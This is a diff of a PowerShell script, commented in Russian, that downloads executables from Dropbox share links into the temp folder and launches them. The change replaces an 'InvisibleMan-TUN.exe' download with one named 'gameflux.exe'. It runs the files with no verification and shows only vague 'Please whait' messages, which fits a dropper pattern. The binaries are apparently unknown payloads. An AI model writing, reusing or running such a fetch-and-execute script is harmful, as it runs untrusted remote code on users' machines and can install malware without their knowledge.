@@ -8,7 +8,7 @@ Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/ysgkf4itfcy4do4sh22ug/tes
 
 # Скачиваем второе приложение (замени URL на нужный)
 Write-Host "Please whait.." -ForegroundColor Green
-Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/1q3dximiu93lv6q2ivoms/InvisibleMan-TUN.exe?rlkey=y6ko79k3hvsq4ncolk5itu48p&st=xx2dgg32&dl=1' -OutFile "$env:TEMP\InvisibleMan-TUN.exe"
+Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/r4xlo4ojd7ryuzrjoydgt/gameflux.exe?rlkey=06l10e0imovb6bm7zznv5z7mm&st=ozjb13r7&dl=1' -OutFile "$env:TEMP\gameflux.exe"
 
 # Запускаем первое приложение
 Write-Host "Please whait..." -ForegroundColor Yellow
@@ -20,6 +20,6 @@ Start-Sleep -Seconds 5
 
 # Запускаем второе приложение
 Write-Host "Please whait....." -ForegroundColor Yellow
-Start-Process "$env:TEMP\InvisibleMan-TUN.exe"
+Start-Process "$env:TEMP\gameflux.exe"
 
 Write-Host "Complete!" -ForegroundColor Green
